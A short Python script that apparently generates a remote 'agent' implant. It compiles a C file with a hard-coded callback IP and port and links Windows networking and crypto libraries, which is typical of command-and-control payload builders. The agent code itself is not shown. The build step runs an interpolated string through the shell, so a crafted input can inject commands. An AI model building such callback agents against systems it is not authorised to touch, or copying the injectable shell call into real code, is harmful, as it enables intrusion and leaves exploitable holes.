import subprocess

#IP to Int
def ip_to_int(ip_addr):
    ip_int = 0
    shift = 24
    octets = ip_addr.split(".")
    for octet in octets:
        octet = int(octet)
        ip_int |= (octet << shift)
        shift -= 8
    return ip_int

def script_generate_agent(ipAddr, port):

    #Compile
    compile= f"gcc apps/agent/agent.c -DIP_ADDRESS={ip_to_int(ipAddr)} -DPORT={port} -o apps/agent/agent -lws2_32 -lsecur32 -lCrypt32"
    try:
        subprocess.run(compile, shell=True, check=True)
        print("Compile Success")
    except:
        print("Compile Failed")
